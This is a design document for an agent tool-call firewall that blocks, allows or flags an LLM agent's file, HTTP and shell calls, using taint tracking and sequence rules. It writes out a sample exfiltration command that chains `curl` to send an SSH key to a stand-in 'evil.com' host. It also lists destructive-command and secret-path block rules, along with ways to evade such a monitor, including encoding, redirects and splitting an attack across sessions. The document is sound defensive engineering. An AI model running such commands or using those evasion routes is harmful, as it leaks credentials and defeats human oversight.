# warden: Agentic Tool-Call Firewall (Design Doc)

Status: v3, decisions D1-D13 locked (see Section 12). This is the full design
record. The one-page submission write-up is `WRITEUP.md`; setup and usage are
in `README.md`.

---

## 1. Problem and stance

warden is a policy-enforcing middleware layer between an LLM agent and its
tools (file system, HTTP, shell). Every proposed tool call passes through
warden, which returns one of three decisions, each with a human-readable
reason:

- **allow**: the call may execute.
- **block**: the call must not execute. Terminal.
- **flag**: the call is withheld, pending human review. A human resolves it
  to allow or deny later (see Section 7).

Core stance: **warden is a deterministic reference monitor.** No LLM in the
decision path. Same event stream + same policy (rules and overrides) + same
session-state snapshot = same decisions, every time. Human review changes the
overrides or the session state, but as an explicit, audited state transition,
never as a hidden input to the decision function. A firewall must be fast,
explainable, and testable; a probabilistic component in the hot path forfeits
all three. (Same philosophy as deterministic policy
gating on infrastructure PRs: the gate itself must be boring and auditable.)

Non-goals:
- warden is not a sandbox. It decides; the agent runtime enforces. It does
  not intercept syscalls or proxy network traffic.
- No anomaly-detection ML. Sequence risks are caught by explicit, explainable
  rules (Section 6), not learned baselines.

## 2. Threat model

The agent is assumed to be **potentially hijacked** (prompt injection via a
document/tool output it read) or simply buggy. In scope:

1. **Direct violations**: read `~/.ssh/id_rsa`, POST to an unknown domain,
   `rm -rf` outside the workspace.
2. **Exfiltration chains**: individually-benign calls that compose into
   sensitive-read followed by outbound-write. The canonical sequence attack.
3. **Write-then-execute**: fetch or write a script into the workspace, then
   run it via shell. Each call alone looks routine.
4. **Probing**: a burst of denied attempts, i.e. an agent scanning the policy
   for gaps.

Out of scope (documented as limitations, Section 11): covert/encoding channels
inside allowed arguments, semantic attacks in file contents, cross-session
correlation.

## 3. Tool-call event schema

Input is a stream of JSONL events, one proposed tool call per line:

```json
{"id": "c-042", "session_id": "s-7", "ts": "2026-09-05T10:12:31Z",
 "tool": "http.post",
 "args": {"url": "https://api.example.com/upload", "body_bytes": 18234},
 "agent": "researcher", "metadata": {"turn": 6}}
```

- `id`, `session_id`, `tool`, `args` are required; the rest is optional
  metadata carried through to decisions and the audit log.
- Canonical tool namespace for the simulation: `fs.read`, `fs.write`,
  `fs.delete`, `fs.list`, `http.get`, `http.post`, `shell.exec`.
- Unknown tool names are structurally valid but match no allow rule, so they
  fall through to the default action (block, Section 5).

Output, one decision per input line:

```json
{"id": "x-3", "session_id": "s-exfil", "decision": "block", "rule": "taint.exfil-post",
 "matched_rules": ["static.http-known-apis", "taint.exfil-post"],
 "reason": "outbound POST after reading PII in this session (session tainted 'pii' by call x-1 reading data/pii/customers.csv)"}
```

`matched_rules` lists every rule that fired, in evaluation order, so a reader
can see that static policy would have allowed this call and the session layer
overrode it. Flag decisions additionally carry `flag_source: rule | quarantine`
so a reviewer can tell a call flagged on its own merits from one flagged only
because its session is quarantined (Section 7). A call flagged on its own
merits inside a quarantined session carries `flag_source: rule` and is
enqueued normally; `quarantine` marks only the flags that exist *solely*
because of the session downgrade.

## 4. Architecture

```
                        +--------------------------------------+
  JSONL (stdin/file) -->|  adapters: CLI  |  HTTP (not built)  |
                        +--------------------------------------+
                                        |
                                        v
                        +--------------------------------------+
                        |            engine (pure library)     |
                        |  1. parse + validate (fail closed)   |
                        |  2. static policy layer (per-call)   |
                        |  3. session layer (taint + sequence) |
                        |  4. combine -> decision + reason     |
                        +--------------------------------------+
                                |                   |
                                v                   v
                        audit log (JSONL)    state store (SQLite):
                                             pending flags, session
                                             state (labels, quarantine)
                                                    ^
                                                    |
                                          `warden review` CLI
```

- The engine is a pure library: no I/O, no globals; state is an explicit
  `SessionState` object keyed by `session_id`. CLI and HTTP are thin adapters.
  This is what makes the engine unit-testable without any transport.
- **Session state is persisted, not process-scoped [D8].** The engine never
  touches storage. The adapter loads a session's `SessionState` (taint labels
  with provenance, quarantine, recent-call window) from the state store before
  evaluating its events and writes it back after. This is what lets a one-shot
  `warden check` honor a quarantine set by an earlier run, and what gives
  `warden review release` an observable effect: without persistence, `release`
  would mutate state that no later decision ever reads.
- Per-event flow: validate, evaluate static policy, evaluate session layer,
  combine, emit. Every decision carries the matched rule id and reason, and
  is appended to an audit log.

**[D1, locked]** How the layers combine: **first-match-wins within the static
policy rule list** (classic firewall ACL semantics, order is meaningful and
auditable), then **most-restrictive-wins across layers** (block > flag >
allow). Rationale: a call that static policy allows can still be an exfil
sink in a tainted session, so the session layer must be able to override an
allow; but two static rules should never silently fight, the first match
settles it. Rejected: pure first-match everywhere (a static allow could
shadow the taint layer, gutting exfil detection) and most-restrictive
everywhere (rule order stops mattering, so targeted exceptions become
impossible).

Reason attribution when layers agree on the winning severity: an explicit
rule beats the default action, and a session-layer rule beats a static rule
(its reason carries more context, e.g. the tainting call). All matched rules
are recorded on the decision as `matched_rules`, so nothing is hidden; the
tie-break only picks which reason leads.

## 5. Policy config

Policy lives in a YAML file loaded at startup and validated strictly: an
invalid policy refuses to start (fail closed, never fall back to defaults).

```yaml
version: 1
default_action: block        # anything no rule allows is blocked

rules:                       # static, per-call; first match wins [D1]
  - id: fs-read-workspace
    tool: fs.read
    match: {path: ["./workspace/**", "./data/**"]}
    action: allow

  - id: fs-list-workspace         # agents list directories constantly; without
    tool: fs.list                 # this, clean-workflow would default-block
    match: {path: ["./workspace/**", "./data/**"]}
    action: allow

  - id: fs-write-workspace        # writes must be allowable or the
    tool: fs.write                # write-then-execute rule can never arm
    match: {path: ["./workspace/**"]}   # (blocked writes wrote nothing, D11)
    action: allow

  - id: fs-read-secrets
    tool: fs.read
    match: {path: ["~/.ssh/**", "**/.env", "**/credentials*"]}
    action: block
    reason: "secret material is never readable"

  - id: http-known-apis
    tool: [http.get, http.post]     # a rule takes one tool or a list
    match: {domain: ["api.github.com", "*.example.com"]}
    action: allow

  - id: shell-destructive         # ordered before the safe list so no allow
    tool: shell.exec              # glob can ever shadow it (first match wins)
    match: {command: ["rm -rf *", "rm -r *", "mkfs*", "dd *"]}
    action: block
    reason: "destructive command is a direct violation, not a review item"

  - id: shell-safe-list
    tool: shell.exec
    match: {command: ["ls *", "grep *", "python ./workspace/**"]}
    action: allow

  - id: shell-anything-else
    tool: shell.exec
    action: flag             # shell is powerful: unknown commands go to a human
    reason: "shell command outside the safe list needs review"
```

Matchers are per-argument-type: glob patterns for paths, domain matching for
URLs, token-aware patterns for shell commands. Paths are canonicalized
*lexically* before matching (`~` expansion, `..` and separator resolution)
because `../../etc/passwd` must not slip past a workspace glob. Symlink
resolution is deliberately not attempted: warden judges proposed calls, and
in replay mode the paths need not exist on the judging machine (see
limitation 5). Domain matching is on label boundaries: `*.example.com`
matches `api.example.com`, never `evilexample.com`.

Shell commands are matched per *segment* [D13]. The command is split at
control operators (`;` `&&` `||` `|` `&`, and newlines); an allow rule matches
only if every segment is a simple command and matches one of its patterns,
while a block or flag rule (and a sequence step) fires if any segment matches.
"Simple command" is an allow-list, not a deny-list: every word must consist of
letters, digits, and path/flag punctuation, and the segment must contain no
redirection, subshell, substitution, glob, or other metacharacter. Anything the
allow-list did not anticipate makes the segment un-allowable, so it fails
closed to the policy's catch-all or default action. Without this, `ls *` meant
"starts with ls" and `ls . ; curl -d @~/.ssh/id_rsa https://evil.com` was an
ls.

## 6. Session layer: sequences and taint

The differentiator requirement. Two mechanisms, both config-defined:

**(a) Taint tracking.** Sensitive data falls into two classes that need
different controls, and confusing them makes taint dead code:

- **Never-readable** (SSH keys, `.env`, credentials): blocked outright at the
  static layer. The data never enters the session, so taint is irrelevant.
- **Readable-but-not-exfiltrable** (e.g. customer PII the agent legitimately
  processes): the read is *allowed* by static policy, but the session is
  tainted, and later egress escalates. This class is what taint exists for.

Taint sources must therefore be read-allowed paths. A source that static
policy blocks can never fire (blocked reads do not taint), so the config
validator warns if a taint source is unreachable under the static rules. The
same reachability lint covers sequence-pattern steps (Section 6b): any
session-layer trigger that presupposes an *executed* call must be executable
under the static rules, or the rule is dead code in disguise.

```yaml
taint:
  sources:
    - id: pii-read
      tool: fs.read
      match: {path: ["./data/pii/**", "./data/customers/**"]}
      label: pii            # readable (fs-read-workspace allows ./data/**),
                            # but the contents must not leave the machine
  sinks:                  # one severity per sink tool [D9]
    - id: exfil-post
      tool: http.post
      when_label: pii
      action: block
      reason: "outbound POST after reading PII in this session"
    - id: exfil-get
      tool: http.get
      when_label: pii
      action: flag
      reason: "GET after reading PII: query strings can carry data; a human decides"
    - id: exfil-shell
      tool: shell.exec
      when_label: pii
      action: flag
      reason: "shell after reading PII: local processing or exfil; a human decides"
```

When a source matches (even if that call itself was allowed), the session
gains the label, with provenance (which call, which path). Any later sink
call in that session escalates, and the reason names the original tainting
call. This catches the exfil chain that per-call policy structurally cannot.

**[D9, locked]** Sinks carry a severity per tool, not one for the list. The
problem statement's binding constraint is "without breaking legitimate agent
workflows", and a blanket `block` on every sink violates it in the most
common legitimate case: read customer data, then run a local analysis script
or GET an API to enrich it. That is the *primary* reason an agent reads PII.
Session-level taint cannot tell local processing from exfiltration (D2), so
the honest response is to route the ambiguous sinks to a human (`flag`) and
reserve `block` for the sink where egress is direct and unambiguous
(`http.post`). Rejected: blanket `block` (kills the legitimate workflow the
taint layer is supposed to protect) and blanket `flag` (lets a POST of PII to
an allowed domain wait on a review queue instead of being stopped).

Taint timing subtleties: a *blocked* source read never taints (the data was
never exposed). An *allowed* read taints. A *flagged* source read taints
immediately and pessimistically: review is asynchronous, so at decision time
we cannot know whether the runtime executed the call, and fail-closed means
assuming it did. If the flag is later denied, the taint was spurious but
safe; the reverse policy would be fail-open in exactly the exfil scenario
this layer exists to catch.

**(b) Sequence rules.** Windowed conditions over recent session history.
A sequence rule produces one of two things, chosen by what the detected
behavior is a property of:

- `action`: a per-call decision, when the dangerous call is the current one
  (write-then-execute: block the exec itself).
- `escalate`: a session state transition, when the behavior indicts the
  session, not the call (probing). A per-call action is the wrong shape for
  probing: the calls tripping the threshold are already blocked, and block
  beats flag, so a per-call flag either never surfaces or lands accidentally
  on unrelated later calls and silently decays with the window.

```yaml
sequences:
  - id: probing
    when: {min_blocked: 3, within_calls: 10}
    escalate: quarantine
    reason: "3+ blocked calls in a 10-call window looks like policy probing"

  - id: write-then-execute
    when:
      pattern:
        - {tool: fs.write, capture: path}
        - tool: shell.exec
          match: {command: ["python *", "python3 *", "bash *", "sh *", "node *"]}
          args_reference: path
      within_calls: 15
    action: block
    reason: "executing a file this session just wrote"
```

Step 2 carries its own `match`, narrowing it to interpreter invocations:
referencing a just-written file is not executing it, and without the
narrowing, `fs.write report.md` followed by `grep total report.md` would
block a legitimate workflow. Direct `./script` execution is not in the
interpreter list; it falls to the shell catch-all (`flag`), which is the
fail-closed outcome, not a hole.

`args_reference` compares *canonicalized path tokens* extracted from the shell
command against the captured path, never a raw substring. Otherwise
`fs.write ./workspace/foo.py` followed by `shell.exec python workspace/foo.py`
would evade write-then-execute on a `./` prefix. The shell tokenizer applies
the same lexical canonicalization as the path matcher (Section 5).

Pattern steps arm under the same execution semantics as taint (D5): an
*allowed* call arms the step, a *flagged* call arms it pessimistically (the
runtime may have executed it), a *blocked* call never does (a blocked write
wrote nothing). This is why the example config allows `fs.write` into
`./workspace/**`: without that rule every write would default-block and
write-then-execute could never be the deciding layer in its own demo [D11].

What counts toward `min_blocked`: any blocked decision *attributable to the
session*. A schema-invalid event that still carries a `session_id` (present but
missing `tool`, wrong types) is blocked and counts; a session emitting three of
those is either broken or probing, and fail-closed does not distinguish. A
malformed JSONL line has no parseable `session_id`, cannot be attributed, and
does not count. This is the collision point between the malformed-garbage and
probing scenarios, and it is tested explicitly.

Quarantine semantics: sticky (no window decay), and every subsequent call in
the session is escalated to at least flag (allow becomes flag; flag and block
are unchanged), with the reason naming the escalating rule and the calls that
tripped it. Only a human releases a quarantined session, via the review CLI.
Release also clears the session's recent-call window: the blocks that tripped
the quarantine have been human-adjudicated, and leaving them in the window
would re-quarantine the session on its very next call, making release a
one-call illusion. Taint labels survive release: lifting a quarantine is not
a declassification of what the session read [D12].
Quarantine and taint labels are the same mechanism: session state set by
rules, consumed by label-conditioned effects (sinks, quarantine downgrade).

**[D10, locked]** Quarantine-induced flags are **recorded, not enqueued**.
They are written to the audit log with `flag_source: quarantine`, but they do
not become individual items in the pending-review queue; the *session* is the
review unit, surfaced by `warden review sessions`. Rationale: the scenario
that trips quarantine (a hijacked or probing agent) is exactly the one that
then emits hundreds of calls, and turning each into a per-call approval is
alert fatigue by design in the moment a human most needs a clear signal. Only
flags with `flag_source: rule` (the call is suspicious on its own merits)
enter the per-call queue. Rejected: enqueue everything (queue flooding) and
block everything under quarantine (a false-positive quarantine would then
halt a legitimate session with no lighter recovery than release).

**[D2, locked]** Taint granularity: **session-level taint labels with
recorded provenance** (which call created the label). Cheap, explainable,
one honest limitation: after a sensitive read, all outbound calls escalate,
including innocent ones. Rejected: per-value dataflow (track which argument
values derive from tainted reads); it needs value-derivation heuristics and
is a research project, not a five-day build. The limitation plus its mitigation
path is written up in Section 11, which reads as maturity, not weakness.

## 7. Flag review flow

`flag` is a real third state: the call is withheld (not executed) until a
human resolves it. This mirrors the allow/ask/deny pattern from
human-in-the-loop agent gating: flag is the "ask".

```
warden review list                 # pending flagged calls, with context
warden review show <id>            # full event + session history + why flagged
warden review approve <id>         # resolve as allowed (recorded, audited)
warden review deny <id>            # resolve as denied
warden review approve <id> --remember
                                   # additionally mint an exception rule into
                                   # a local overrides file so this workflow
                                   # stops flagging in the future
warden review sessions             # sessions in quarantine, with trigger calls
warden review release <session_id> # human releases a quarantined session
```

Pending flags and resolutions persist in SQLite (stdlib `sqlite3`, no server).
Resolutions are audit events: who, when, what rule got minted. `--remember`
is the mechanism that satisfies "without breaking legitimate agent
workflows": the firewall learns exceptions through humans, never silently.

Minted exceptions are deliberately conservative: the rule matches the exact
tool and exact argument values of the approved call, nothing wider, and it
is written to an overrides file that is evaluated *before* the main rule
list (first-match-wins means position is the priority mechanism, and an
appended exception would be shadowed by the very rule that flagged it).
Close variants of an approved call re-flag; that is the intended trade. A
human approved one specific call, not a pattern, and silently generalizing
their approval is how firewalls grow holes. Pattern-scoped exceptions
(reviewer edits a suggested rule at approve time) are the documented
upgrade path.

Interaction with quarantine: a minted exception is a static `allow`, and under
D1 the session layer's `flag` outranks it, so an exception minted for a call in
a quarantined session has no effect until the session is released. That is
correct (only `release` lifts quarantine), but it is a trap for the reviewer
who believes they just whitelisted the call. So `approve --remember` refuses
with an explicit message, pointing at `release`, whenever the flag's session
is *currently quarantined*, regardless of `flag_source`: a rule-flagged call
inside a quarantined session would mint an exception just as shadowed as a
quarantine-flagged one. Plain `approve` (no minting) still works either way.
The reviewer never mints a rule that silently does nothing.

## 8. Failure semantics: fail closed

- Malformed JSONL line: emit a `block` decision with reason "malformed event",
  continue with the next line. One bad line never kills the stream.
- Structurally valid but schema-violating event (missing `tool`, wrong types):
  block, with the specific validation error as the reason.
- Invalid policy file: refuse to start. Never run with a partial policy.
- Unknown tool: falls to `default_action` (block).
- Oversized/adversarial inputs (10MB arg strings, deeply nested args): bounded
  parsing, block with reason.
- Session-id spray: the in-memory working set of sessions is bounded (LRU,
  configurable). Evicted sessions are flushed to the state store, not
  discarded, and reload on their next event, so a stream of unique
  `session_id`s cannot grow memory without bound and eviction never loses a
  taint label or a quarantine.

The principle stated once in the write-up: **every failure path degrades to
block, never to allow.**

## 9. CLI surface

```
warden check  --policy policy.yaml <events.jsonl | ->   # JSONL in, JSONL out
warden validate --policy policy.yaml                    # strict schema check + reachability lint
warden review list | show | approve | deny | sessions | release   # Section 7
warden replay scenarios/<name>.jsonl --policy ...       # bundled demo scenarios
```

Not built: an HTTP adapter (`warden serve`) over the same engine. The engine
is a pure library, so the adapter is a thin wrapper, but shipping it would
expose the single-writer limitation (Section 11, item 7) without addressing
it. See `WRITEUP.md`, limitation 3.

`check` reads stdin with `-` and exits with a distinct code so CI can tell
"rejected" from "needs a human": `0` every call allowed, `1` at least one call
blocked, `2` calls flagged and pending review (no blocks). A run with pending
flags is not a clean run, and a single non-zero code would hide that.

`replay` runs against an **ephemeral in-memory state store by default**, never
the operator's real store. A demo must not pollute the review queue, and a
quarantine set by `replay probing` must not leak into the next replay and flag
calls it should not; that leak would also break the determinism test.
`--store <path>` opts into a persistent store. Bundled scenarios use
non-colliding `session_id`s for the same reason.

The review loop is therefore not a scenario: it is an interaction across runs
against a persistent store, which `replay` deliberately does not have.
`scripts/review-walkthrough.sh` demonstrates it end to end (queue, show,
approve with `--remember`, exact-match re-flag, deny, quarantine, refused
`--remember`, release) against a temporary store, and a test executes the
script so the demo cannot rot.

Bundled scenarios: clean-workflow (all allowed, proves we do not break
legitimate work), pii-processing (read PII, then run a local script: lands as
`flag`, not `block`, demonstrating D9), exfil-chain, write-then-execute,
probing, malformed-garbage, shell-chaining (a legitimate `ls && grep` chain
stays allowed; `ls ; curl` falls to the catch-all; `ls && rm -rf` blocks; a
chained execute of a just-written file trips write-then-execute, D13). The exfil-chain scenario POSTs to an *allowed*
domain: the point is a call that would pass in a clean session and is
blocked only because the session is tainted. If the POST were to a blocked
domain, static policy would catch it and the demo would prove nothing about
the session layer.

## 10. Testing

- Unit: each matcher (path canonicalization edge cases: `..`, `~`, absolute
  vs relative; domain label boundaries: `evilexample.com` must never match
  `*.example.com` or `example.com`; shell token patterns), rule ordering,
  default action, reason attribution tie-breaks.
- Scenario: replay each bundled JSONL scenario, assert the exact decision
  sequence. These double as the demo.
- Adversarial: malformed lines mid-stream, unknown tools, huge args, empty
  files, a spray of unique session ids past the LRU bound. Assert: no crash,
  everything blocked with a reason, memory bounded, no label lost on eviction.
- Determinism: same stream + policy against an empty state store, twice,
  identical output.
- Persistence: run the probing scenario, then a second `check` on the same
  session against the same store; assert the second run's allows arrive as
  `flag` with `flag_source: quarantine`. Then `release`, rerun, assert allows.
- Replay isolation: `replay probing` followed by `replay clean-workflow`;
  assert the second is unaffected and the real store is untouched.
- Exit codes: all-allowed → 0, any block → 1, flags only → 2.
- Probing/malformed collision: three attributable schema-invalid events
  quarantine the session; three unparseable lines do not.
- `--remember` on any flag in a still-quarantined session is refused with a
  message (both flag_source values); on a rule flag in a clean session it
  mints an exact-match override that is evaluated first and takes effect.
- Compound shell commands: segments split on every control operator and on
  newline; each un-allowable class (redirection, subshell, substitution,
  variable, glob, brace, history, comment marker, non-ASCII) defeats an allow;
  permission requires every segment, restriction fires on any; empty and
  operator-only commands match nothing; an operator glued to a path token no
  longer hides the path from write-then-execute; the registry of argument
  types covers every MatchSpec field.
- Sequence arming: a blocked `fs.write` does not arm write-then-execute; a
  flagged write does (pessimistic); an allowed write does. The lint rejects a
  policy where no static rule could ever let a pattern step execute.

## 11. Known limitations (seed list for the write-up)

1. Session-level taint is coarse: after one sensitive read, every outbound
   call escalates, including innocent ones. Mitigation path: per-argument
   provenance, declassification rules (e.g. an approved redaction step
   clears the label).
2. Argument matching can be bypassed by indirection: base64 in shell args,
   URL redirects, writing a secret to an allowed path then reading it from
   there. Percent-encoded paths (`%2e%2e`) are matched literally: a
   filesystem does not decode them, so no traversal occurs, but a runtime
   whose file tool decodes paths would need to decode before proposing. A
   production version needs argument canonicalization and enforcement at the
   execution boundary, not just the proposal boundary.
3. warden decides but does not enforce; a runtime that ignores decisions gets
   no protection. In production this sits inside the tool-execution gateway.
4. No cross-session correlation: an attacker splitting the chain across two
   sessions evades the session layer.
5. TOCTOU: a path can change between decision time and execution time
   (symlink swap). Inherent to proposal-time checking.
6. No session lifecycle: there is no session-end event, so persisted state
   (labels, quarantine, windows) lives until pruned. Memory is bounded (LRU,
   Section 8) but the store is not. Mitigation path: an explicit session-end
   event from the runtime, or a TTL on idle sessions with the expiry recorded
   as an audit event so a released-by-timeout quarantine is never silent.
7. Single-writer assumption: session-state updates are read-modify-write with
   no locking. Two concurrent processes, or parallel requests in a future HTTP
   adapter, touching the same session can race and lose a label or a quarantine.
   Acceptable for a single-operator CLI; a production deployment needs
   transactional state updates or a single-writer decision gateway.

## 12. Decision log

- **D1 (locked)** Layer combination: first-match-wins within the static rule
  list, most-restrictive-wins (block > flag > allow) across layers.
  Why: ordered ACLs keep exceptions expressible; the session layer must be
  able to override a static allow or taint detection is pointless.
- **D2 (locked)** Taint granularity: session-level labels with provenance.
  Why: explainable and buildable in the window; the false-positive cost is
  documented as a limitation with a mitigation path (per-value provenance,
  declassification).
- **D3 (locked)** Dependencies: Python 3.12, pydantic v2 (event and policy
  validation), typer (CLI), PyYAML, pytest; FastAPI + uvicorn only if the
  HTTP adapter ships. Why: strict validation nearly free, and every
  dependency is production-familiar. Rejected stdlib-only: hand-rolled
  validation is exactly where malformed-input bugs live.
- **D4 (locked)** Two-class sensitive-data model: never-readable paths are
  statically blocked; readable-but-not-exfiltrable paths are taint sources.
  Why: v1 of this doc had every taint source also statically blocked, which
  made the session layer unreachable in its own demo scenario (blocked reads
  do not taint). Caught in design review. The mirror bug existed on the sink
  side: no static allow rule covered `http.post`, so the demo POST would have
  been default-blocked and taint never the deciding layer. Consequence: the
  config validator warns when a taint source is unreachable under the static
  rules, and the exfil demo egresses to an allowed domain.
- **D5 (locked)** Flag timing: an unresolved flagged taint-source read taints
  the session immediately (pessimistic). Why: review is asynchronous to the
  stream; at decision time we cannot know whether the runtime executed the
  call, and fail-closed means assuming it did. Optimistic taint-on-approve
  would be fail-open in the exact scenario the layer exists to catch.
- **D6 (locked)** Minted exceptions (`--remember`) are exact-match (tool +
  exact argument values) and prepended via an overrides file evaluated before
  the main rules. Why: under first-match-wins, position is priority, and an
  appended exception would be shadowed by the rule that flagged it; exact
  scope because a human approved one call, not a pattern. Pattern-scoped
  exceptions are the documented upgrade path.
- **D7 (locked)** Sequence rules produce either a per-call `action` or a
  session `escalate`, by what the behavior indicts. Why: probing as a
  per-call flag was unobservable on the tripping call (block beats flag)
  and accidental on later calls, decaying silently with the window. Caught
  in design review. Quarantine is sticky session state, downgrades allow to
  flag, and only a human releases it; it reuses the taint-label machinery.
- **D8 (locked)** Session state is persisted in the SQLite state store and
  loaded/written by the adapter around each session's events; the engine stays
  a pure library. Why: v2 review found that with process-scoped state, a
  one-shot `check` could not honor a quarantine set by an earlier run, so
  `warden review release` would have shipped as a command with no observable
  effect. Consequences: `replay` defaults to an ephemeral store so demos
  cannot leak quarantine between runs (which would also break determinism);
  the in-memory working set is LRU-bounded with eviction to the store, which
  closes the session-id-spray gap; and the determinism claim is restated as
  holding for a fixed policy + overrides + session-state snapshot.
- **D9 (locked)** Sink severity is per tool: `http.post → block`,
  `http.get → flag`, `shell.exec → flag`. Why: a blanket block on every sink
  breaks the primary legitimate PII workflow (read, then process locally or
  enrich via GET), which is the constraint the problem statement names.
  Session-level taint cannot separate processing from exfiltration (D2), so
  ambiguous sinks go to a human and only direct egress is stopped outright.
- **D10 (locked)** Quarantine-induced flags are recorded (`flag_source:
  quarantine`) but not enqueued; the session is the review unit. Why: the
  scenario that trips quarantine is the one that then emits hundreds of calls,
  and per-call approvals there are alert fatigue by design. Dual-source edge:
  a call flagged on its own merits inside a quarantined session is
  `flag_source: rule` and enqueued normally. Corollary: `approve --remember`
  refuses whenever the flag's session is still quarantined (regardless of
  flag_source), since under D1 the minted static allow is outranked by the
  session layer until `release`, and minting a rule that silently does
  nothing is worse than refusing.
- **D11 (locked)** Sequence-step arming mirrors D5: allowed calls arm a
  pattern step, flagged calls arm it pessimistically, blocked calls never do.
  Why: v2's config had no `fs.write` allow rule, so every write
  default-blocked and write-then-execute could never be the deciding layer in
  its own demo. Fourth instance of the reachability class (after D4's source
  and sink bugs and D7's shadowed probing flag). Caught in design review.
  Consequence: an `fs-write-workspace` allow rule, and the validator's
  reachability lint generalized from taint sources to sequence-pattern steps.
- **D12 (locked)** `release` clears the quarantine AND the recent-call
  window, but never taint labels. Why: caught by the release lifecycle test,
  the historical blocks still in the window re-quarantined the session on its
  next call, so release was a one-call illusion. The window is cleared
  because that history is exactly what the human adjudicated; labels survive
  because releasing a quarantine says "this session may continue," not "what
  it read is no longer sensitive."
- **D13 (locked)** Shell commands are matched per segment, and the match mode
  follows the rule's action: permission (allow) is a conjunction over
  segments, each of which must be a simple command drawn from a plain-token
  allow-list; restriction (block, flag, sequence steps) is a disjunction. Why:
  found after the v3 freeze by probing the safe list with `ls . ; curl ...`,
  which the whitespace tokenizer read as an `ls` with extra arguments. Seven of
  nine chained or substituted commands were allowed, and the same bug let
  `ls . ; python ./workspace/helper.py` slip past write-then-execute because
  the interpreter pattern was anchored to the first token. Rejected: a deny-list
  of dangerous metacharacters (fails open the day one is forgotten; shell has
  many) and a full shell parser (nobody can parse shell without executing it;
  aliases, functions, `eval`, and `IFS` defeat any parser, and a parser gives
  false confidence). Consequence: the engine gained an argument-type registry
  so the per-segment mode is a property of compound argument types, not of
  shell, and adding an argument type touches one matcher and one registry
  entry. False positives from the allow-list (`grep 'a|b' f`) land as flag and
  are resolved through review and `--remember`, which is the workflow the
  problem statement asked for.
